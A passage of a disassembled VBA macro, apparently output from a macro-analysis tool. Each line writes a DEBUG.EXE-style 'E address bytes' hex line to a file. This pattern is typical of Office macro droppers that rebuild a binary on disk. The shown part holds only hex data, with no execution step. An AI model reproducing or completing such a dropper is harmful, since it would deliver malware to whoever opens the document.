' 	PrintItemNL 
' Line #1365:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4930 09 F7 EF 09 F7 EF 45 94 99 52 6A 76 4F 62 6F 4D"
' 	PrintItemNL 
' Line #1366:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4940 60 6D 2C 77 81 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #1367:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4950 EF 25 74 7C 2F 46 56 58 6C 7D 71 81 91 5B 6B 77"
' 	PrintItemNL 
' Line #1368:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4960 0A 1A 20 1A 29 2C 09 19 1F 27 37 3E 4E 5E 6B 3D"
' 	PrintItemNL 
' Line #1369:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4970 4D 5D 38 4D 5C 6D 84 93 6D 83 8F 44 57 5F 30 3F"
' 	PrintItemNL 
' Line #1370:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4980 42 00 06 06 00 00 F4 F3 F7 EB ED EE DB DB DB CA"
' 	PrintItemNL 
' Line #1371:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4990 CC CC C4 C7 C5 BA BF BD 00 01 00 57 5C 5D 4A 4E"
' 	PrintItemNL 
' Line #1372:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 49A0 53 53 59 60 50 56 5D 26 A0 A0 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #1373:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 49B0 09 F7 EF 2A 6C 6C 39 43 4A 2A 36 3C 2E 38 3F 38"
' 	PrintItemNL 
' Line #1374:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 49C0 42 49 38 41 4A 38 41 4A 39 42 4B 22 82 83 09 F7"
' 	PrintItemNL 
' Line #1375:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 49D0 EF 09 F7 EF 09 F7 EF 0F B6 B3 12 1A 21 0C 14 1B"
' 	PrintItemNL 
' Line #1376:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 49E0 0C 14 1B 0A 0E 13 10 0F 13 02 00 01 CC C9 CB 09"
' 	PrintItemNL 
' Line #1377:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 49F0 F7 EF 09 F7 EF 09 F7 EF 83 FA F7 FD FF FF F4 F6"
' 	PrintItemNL 
' Line #1378:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4A00 F7 E5 E7 E8 D1 D5 D6 CF D3 D4 DC E1 E4 B1 F0 F1"
' 	PrintItemNL 
' Line #1379:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4A10 09 F7 EF 09 F7 EF B1 F4 F9 C4 CE DF 80 8C A4 00"
' 	PrintItemNL 
' Line #1380:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4A20 05 22 00 11 32 36 4B 6B 5A 72 90 7B 96 B0 6B 85"
' 	PrintItemNL 
' Line #1381:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4A30 9D 73 8E A3 5F BA C8 09 F7 EF 34 EC ED BD D6 F0"
' 	PrintItemNL 
' Line #1382:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4A40 B9 D2 EC B1 CB E3 1D F1 ED 09 F7 EF 09 F7 EF 09"
' 	PrintItemNL 
' Line #1383:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4A50 F7 EF 2E 76 85 1E 2E 45 43 58 6E 8D A5 BD 65 81"
' 	PrintItemNL 
' Line #1384:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4A60 9F 4E 6D 8E 58 75 9C 11 E5 E3 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #1385:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4A70 09 F7 EF 8A DB DF 79 F1 F3 09 F7 EF 09 F7 EF 63"
' 	PrintItemNL 
' Line #1386:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4A80 F9 F5 FF FE FF FE FE FE FF FF FF FF FE FF B3 B6"
' 	PrintItemNL 
' Line #1387:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4A90 BB 04 7C 7B 09 F7 EF 09 F7 EF 4E 9E A6 48 63 71"
' 	PrintItemNL 
' Line #1388:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4AA0 46 5D 6C 54 6B 7B 46 93 9D 09 F7 EF 09 F7 EF 09"
' 	PrintItemNL 
' Line #1389:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4AB0 F7 EF 09 F7 EF 22 8C 93 55 6D 7F 68 7E 90 6C 7F"
' 	PrintItemNL 
' Line #1390:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4AC0 8E 5C 6C 78 04 14 1A 0D 1E 21 18 28 2E 2A 3A 41"
' 	PrintItemNL 
' Line #1391:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4AD0 47 57 64 3E 51 60 28 3D 4C 53 6A 79 92 A7 B6 60"
' 	PrintItemNL 
' Line #1392:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4AE0 72 7D 2C 3A 40 00 01 03 00 00 FD F9 FE F1 F0 F2"
' 	PrintItemNL 
' Line #1393:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4AF0 E0 DF E1 D1 D1 D1 C5 C6 C4 B4 B7 B5 00 01 00 5D"
' 	PrintItemNL 
' Line #1394:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4B00 61 62 47 4B 50 49 4F 54 46 4C 53 19 BF BC 09 F7"
' 	PrintItemNL 
' Line #1395:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4B10 EF 09 F7 EF 09 F7 EF 0A 4F 4E 0A 13 16 0D 19 1B"
' 	PrintItemNL 
' Line #1396:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4B20 23 2C 30 22 2B 2F 17 20 24 32 3B 3F 43 49 4E 26"
' 	PrintItemNL 
' Line #1397:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4B30 2C 31 0D DF D8 09 F7 EF 09 F7 EF 0F 7A 79 08 0C"
' 	PrintItemNL 
' Line #1398:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4B40 11 04 08 0D 0D 10 15 14 15 19 07 04 06 06 01 03"
' 	PrintItemNL 
' Line #1399:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4B50 F0 ED EF 09 F7 EF 09 F7 EF 09 F7 EF 82 F9 F6 FD"
' 	PrintItemNL 
' Line #1400:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4B60 FC FE F9 FB FC F6 F8 F9 E0 E4 E5 D0 D4 D5 D6 DB"
' 	PrintItemNL 
' Line #1401:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4B70 DE AF EF EF 09 F7 EF 09 F7 EF 9D E0 E5 CC D6 E7"
' 	PrintItemNL 
' Line #1402:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4B80 53 5E 79 06 13 33 42 53 74 60 75 94 79 92 AC 92"
' 	PrintItemNL 
' Line #1403:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4B90 AE C6 BF D9 F1 BA D3 ED 87 D3 E6 09 F7 EF 2B E3"
' 	PrintItemNL 
' Line #1404:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4BA0 E5 88 9C BF 82 98 BC 83 99 BD 30 DB E1 09 F7 EF"
' 	PrintItemNL 
' Line #1405:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4BB0 09 F7 EF 09 F7 EF 92 F5 F9 CE DC F8 AB BF D8 A3"
' 	PrintItemNL 
' Line #1406:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4BC0 BD D5 8F AD C6 73 92 B1 46 7E 9D 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #1407:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4BD0 EF 09 F7 EF 09 F7 EF BA D4 DD 99 E5 EA 09 F7 EF"
' 	PrintItemNL 
' Line #1408:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4BE0 09 F7 EF 17 F7 EF EC FD FD FB FB FB FF FD FD FB"
' 	PrintItemNL 
' Line #1409:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4BF0 FD FE EB EF F4 33 BE BD 09 F7 EF 09 F7 EF 46 95"
' 	PrintItemNL 
' Line #1410:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4C00 9F 50 6C 7D 4E 66 78 47 5F 71 47 95 A0 09 F7 EF"
' 	PrintItemNL 
' Line #1411:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4C10 09 F7 EF 09 F7 EF 09 F7 EF 17 B7 B8 56 6F 83 71"
' 	PrintItemNL 
' Line #1412:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4C20 87 99 6B 7D 8E 38 49 56 00 12 19 1E 2E 34 23 33"
' 	PrintItemNL 
' Line #1413:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4C30 39 2D 3E 47 3A 4B 58 33 46 55 37 4C 5B 41 58 67"
' 	PrintItemNL 
' Line #1414:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4C40 88 9D AC 81 93 9E 38 46 4C 00 01 03 00 00 FA F4"
' 	PrintItemNL 
' Line #1415:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4C50 F9 EE EB ED E0 DD DF D2 D2 D2 C5 C6 C4 B4 B7 B5"
' 	PrintItemNL 
' Line #1416:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4C60 00 01 00 6C 70 71 66 6A 6F 6B 71 78 73 78 81 22"
' 	PrintItemNL 
' Line #1417:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4C70 D7 D4 09 F7 EF 09 F7 EF 09 F7 EF 17 5C 5B 08 11"
' 	PrintItemNL 
' Line #1418:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4C80 14 03 0D 0D 00 01 04 00 04 07 12 19 1C 1D 22 25"
' 	PrintItemNL 
' Line #1419:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4C90 19 1D 1E 17 1B 1C 03 31 31 09 E9 E1 09 F7 EF 02"
' 	PrintItemNL 
' Line #1420:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4CA0 2E 2E 00 00 01 02 01 03 02 00 01 02 00 01 04 00"
' 	PrintItemNL 
' Line #1421:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4CB0 00 65 60 61 FF FE FF 09 F7 EF 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #1422:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4CC0 81 F8 F5 F7 F6 F8 FC FE FF FD FF FF F0 F3 F7 D3"
' 	PrintItemNL 
' Line #1423:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4CD0 D6 DA CD D0 D4 AD EB EC 09 F7 EF 09 F7 EF 90 D3"
' 	PrintItemNL 
' Line #1424:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4CE0 D9 AD BA CA 32 3F 59 2D 3C 5C 50 63 84 7A 8F AF"
' 	PrintItemNL 
' Line #1425:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4CF0 BB D3 EF AD C5 E1 6E 83 A2 61 75 98 42 8A A6 09"
' 	PrintItemNL 
' Line #1426:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4D00 F7 EF 1C D4 D9 5E 6D 9E 59 6A 9D 54 65 98 3C AC"
' 	PrintItemNL 
' Line #1427:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4D10 C6 09 F7 EF 09 F7 EF 09 F7 EF 2B C5 CF 84 91 B7"
' 	PrintItemNL 
' Line #1428:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4D20 A9 BC DD D0 E8 FF D3 F0 FF A0 C0 DD 35 C8 D3 09"
' 	PrintItemNL 
' Line #1429:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4D30 F7 EF 09 F7 EF 09 F7 EF 18 DE DB B0 C0 CC B0 E0"
' 	PrintItemNL 
' Line #1430:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4D40 E8 09 F7 EF 09 F7 EF 09 F7 EF 81 FA F6 F8 FA FA"
' 	PrintItemNL 
' Line #1431:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4D50 FD FC FE FD FE FF FA FD FF 3D F3 EF 09 F7 EF 09"
' 	PrintItemNL 
' Line #1432:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4D60 F7 EF 42 93 9E 4C 67 7B 54 6D 81 43 5C 70 38 86"
' 	PrintItemNL 
' Line #1433:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4D70 93 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #1434:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4D80 3C 8A 97 6D 85 99 6F 83 95 23 34 41 10 21 2A 2A"
' 	PrintItemNL 
' Line #1435:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4D90 3C 43 28 3A 41 39 4C 54 39 49 59 37 49 5A 33 47"
' 	PrintItemNL 
' Line #1436:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4DA0 58 3F 53 64 8A 9D AC 92 A4 AF 2A 38 3E 00 01 03"
' 	PrintItemNL 
' Line #1437:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4DB0 00 00 F5 EF F4 EB E8 EA DE DC DC D0 D0 D0 C6 C7"
' 	PrintItemNL 
' Line #1438:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4DC0 C5 B8 BA BA 01 05 06 6D 71 76 77 7D 84 62 69 72"
' 	PrintItemNL 
' Line #1439:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4DD0 53 5C 66 11 E3 DE 09 F7 EF 09 F7 EF 09 F7 EF 3C"
' 	PrintItemNL 
' Line #1440:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4DE0 82 85 41 4C 50 13 1C 20 05 0E 12 05 0E 11 00 00"
' 	PrintItemNL 
' Line #1441:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4DF0 03 00 00 03 06 0A 0B 00 00 01 20 22 23 32 5F 5D"
' 	PrintItemNL 
' Line #1442:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4E00 2D B3 AE 79 77 77 97 92 93 A6 A1 A2 99 94 95 7E"
' 	PrintItemNL 
' Line #1443:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4E10 79 7A 11 0C 0D C1 BC BD FF FE FF 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #1444:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4E20 EF 09 F7 EF 52 F6 F2 F8 F7 F9 F7 F9 FA FB FD FE"
' 	PrintItemNL 
' Line #1445:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4E30 FA FB FF DD E0 E4 C8 CB CF AB E9 EA 09 F7 EF 09"
' 	PrintItemNL 
' Line #1446:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4E40 F7 EF 85 C8 CD A1 AD BF 24 30 4C 45 54 75 AA BD"
' 	PrintItemNL 
' Line #1447:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4E50 E0 BE D2 F5 6D 84 A4 35 4B 6E 54 67 8D 58 69 94"
' 	PrintItemNL 
' Line #1448:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4E60 4A 90 B2 09 F7 EF 20 D7 DE 66 73 AB 64 72 AC 64"
' 	PrintItemNL 
' Line #1449:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4E70 72 AD 3F 83 AE 09 F7 EF 09 F7 EF 09 F7 EF 0E EF"
' 	PrintItemNL 
' Line #1450:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4E80 EA 50 5F 8D 41 54 7A 3F 55 78 7A 96 B5 9F CA E5"
' 	PrintItemNL 
' Line #1451:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4E90 14 F6 F0 09 F7 EF 09 F7 EF 09 F7 EF 1C AC B0 9A"
' 	PrintItemNL 
' Line #1452:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4EA0 AB B8 E1 E5 F0 09 F7 EF 09 F7 EF 09 F7 EF 17 F7"
' 	PrintItemNL 
' Line #1453:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4EB0 EF E3 F4 F3 FA F9 FB FD FE FF E8 FC FE 09 F7 EF"
' 	PrintItemNL 
' Line #1454:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4EC0 09 F7 EF 09 F7 EF 3A 8A 97 48 65 7A 4E 69 7E 42"
' 	PrintItemNL 
' Line #1455:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4ED0 5A 70 30 7F 8C 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #1456:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4EE0 EF 09 F7 EF 09 F7 EF 28 D4 D5 49 A1 AB 1C 2F 3E"
' 	PrintItemNL 
' Line #1457:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4EF0 24 36 41 2A 3D 44 2D 40 47 4E 62 6D 4A 5C 6D 55"
' 	PrintItemNL 
' Line #1458:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4F00 69 7B 46 5A 6B 56 6A 7B 91 A4 B3 A1 B1 BD 2F 3B"
' 	PrintItemNL 
' Line #1459:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4F10 41 00 08 0A 00 00 FA F7 F9 F3 F0 F2 E2 E0 E0 CE"
' 	PrintItemNL 
' Line #1460:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4F20 CE CE C2 C4 C4 B6 BA BB 00 00 03 58 60 67 4D 56"
' 	PrintItemNL 
' Line #1461:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4F30 60 34 3D 4B 29 33 44 09 F7 EF 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #1462:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4F40 09 F7 EF 39 49 56 47 53 5F 5B 65 6F 44 4D 57 22"
' 	PrintItemNL 
' Line #1463:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4F50 2B 34 36 3D 46 6C 74 7B AD B3 B8 E2 E6 EB F5 F6"
' 	PrintItemNL 
' Line #1464:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4F60 FA FF FE FF FF FF FF FB F9 F9 FE FA F9 FF FF FE"
' 	PrintItemNL 
' Line #1465:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4F70 FF FF FE FB F7 F6 F1 ED EC FF FF FE FD FB FA 09"
' 	PrintItemNL 
' Line #1466:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4F80 F7 EF 09 F7 EF 09 F7 EF 45 F8 F3 FC FB FD F3 F2"
' 	PrintItemNL 
' Line #1467:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4F90 F6 EC ED F1 FA FB FF EE EF F3 D1 D1 D7 AC E8 EA"
' 	PrintItemNL 
' Line #1468:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4FA0 09 F7 EF 09 F7 EF 8A CD D3 73 81 93 3D 4B 68 B8"
' 	PrintItemNL 
' Line #1469:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4FB0 C8 EC 90 A1 C8 1F 32 58 2D 42 68 50 64 8D 5A 6A"
' 	PrintItemNL 
' Line #1470:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4FC0 99 5E 6B 9F 61 6A A3 09 F7 EF 1D D3 DC 59 65 9F"
' 	PrintItemNL 
' Line #1471:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4FD0 55 63 9E 55 63 9E 5B 68 A6 09 F7 EF 09 F7 EF 09"
' 	PrintItemNL 
' Line #1472:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4FE0 F7 EF 09 F7 EF 48 AA C8 62 74 A3 57 6D 97 3F 57"
' 	PrintItemNL 
' Line #1473:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4FF0 7B 18 9E A9 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #1474:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5000 2F 8A 95 82 95 A2 DA E0 EB 3F F3 EF 09 F7 EF 09"
' 	PrintItemNL 
' Line #1475:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5010 F7 EF 09 F7 EF 42 F5 EF F9 F8 FA FD FE FF 97 F4"
' 	PrintItemNL 
' Line #1476:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5020 F7 09 F7 EF 09 F7 EF 09 F7 EF 2B 6F 7E 52 6E 86"
' 	PrintItemNL 
' Line #1477:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5030 48 62 7A 3A 52 6A 33 81 8F 09 F7 EF 09 F7 EF 09"
' 	PrintItemNL 
' Line #1478:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5040 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #1479:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5050 EF 0E D3 D0 29 65 6C 30 43 4B 3D 50 58 50 63 70"
' 	PrintItemNL 
' Line #1480:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5060 3E 52 63 58 6C 7E 6A 7E 8F 5A 6C 7D 6E 7E 8F 96"
' 	PrintItemNL 
' Line #1481:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5070 A6 B3 44 4D 56 00 02 06 00 00 FB F8 FA F3 F2 F4"
' 	PrintItemNL 
' Line #1482:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5080 E1 E1 E1 CB CD CD BF C4 C3 B5 BA BB 00 00 04 52"
' 	PrintItemNL 
' Line #1483:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5090 5B 65 52 5B 69 49 55 67 4E 5B 71 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #1484:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 50A0 EF 09 F7 EF 09 F7 EF 34 47 5C 2F 3E 51 3D 4B 5D"
' 	PrintItemNL 
' Line #1485:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 50B0 5C 68 7A 66 70 81 61 6B 7C 8F 98 A6 D1 DA E4 EE"
' 	PrintItemNL 
' Line #1486:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 50C0 F5 FE F7 FA FF FB FE FF FD FE FF FE FD FF FF FE"
' 	PrintItemNL 
' Line #1487:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 50D0 FE FF FF FE FF FF FE FF FF FE FF FF FE FB F9 F8"
' 	PrintItemNL 
' Line #1488:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 50E0 FE FC FB 09 F7 EF 09 F7 EF 09 F7 EF 44 F7 F2 F3"
' 	PrintItemNL 
' Line #1489:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 50F0 F2 F4 EE ED F1 E5 E4 E8 F4 F5 F9 F7 F8 FC E1 E1"
' 	PrintItemNL 
' Line #1490:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5100 E7 AB E7 E9 09 F7 EF 09 F7 EF 80 C4 CA 5F 6F 80"
' 	PrintItemNL 
' Line #1491:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5110 A2 B0 CD 75 85 AA 0E 1E 48 41 52 7D 50 63 8E 59"
' 	PrintItemNL 
' Line #1492:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5120 69 97 5F 6C A0 57 62 9B 51 59 94 09 F7 EF 1C D2"
' 	PrintItemNL 
' Line #1493:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5130 DA 56 64 99 52 62 97 4D 5C 94 4F 5D 97 21 CB D7"
' 	PrintItemNL 
' Line #1494:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5140 09 F7 EF 09 F7 EF 09 F7 EF 0E EF EB 46 90 B5 56"
' 	PrintItemNL 
' Line #1495:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5150 77 A3 32 A7 B9 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #1496:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5160 EF 09 F7 EF 17 3B 4F 7C 8F 9E CB D1 DC 5E E6 E5"
' 	PrintItemNL 
' Line #1497:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5170 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 64 FA F5 CB"
' 	PrintItemNL 
' Line #1498:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5180 FA FC 1F F1 EB 09 F7 EF 09 F7 EF 09 F7 EF 30 4C"
' 	PrintItemNL 
' Line #1499:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 5190 64 4C 68 80 45 5E 78 34 4C 64 37 77 88 09 F7 EF"
